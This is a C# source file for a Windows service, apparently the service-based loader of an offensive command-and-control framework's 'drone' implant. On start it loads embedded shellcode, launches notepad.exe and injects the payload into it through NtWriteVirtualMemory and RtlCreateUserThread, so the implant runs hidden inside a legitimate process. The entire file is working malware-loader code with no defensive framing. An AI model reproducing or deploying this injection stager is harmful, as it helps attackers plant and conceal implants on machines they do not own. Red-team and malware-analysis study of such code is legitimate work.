using System;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Threading;

using DroneService.Invocation.Injection;

namespace DroneService
{
    public partial class Service : ServiceBase
    {
        public Service()
        {
            InitializeComponent();
        }
        
        protected override void OnStart(string[] args)
        {
            var shellcode = Utilities.GetEmbeddedResource("drone");
            var payload = new PICPayload(shellcode);

            var self = System.Reflection.Assembly.GetExecutingAssembly();
            var types = self.GetTypes();

            var alloc = (from type in types where type.Name.Equals(Allocation)
                select (AllocationTechnique)Activator.CreateInstance(type)).FirstOrDefault();
            
            var exec = (from type in types where type.Name.Equals(Execution)
                select (ExecutionTechnique)Activator.CreateInstance(type)).FirstOrDefault();
            
            var process = Process.Start(SpawnTo);

            _ = Injector.Inject(payload, alloc, exec, process);
            
            Thread.Sleep(5000);
            
            Stop();
        }

        private static string SpawnTo => @"C:\Windows\System32\notepad.exe";
        private static string Allocation => "NtWriteVirtualMemory";
        private static string Execution => "RtlCreateUserThread";
    }
}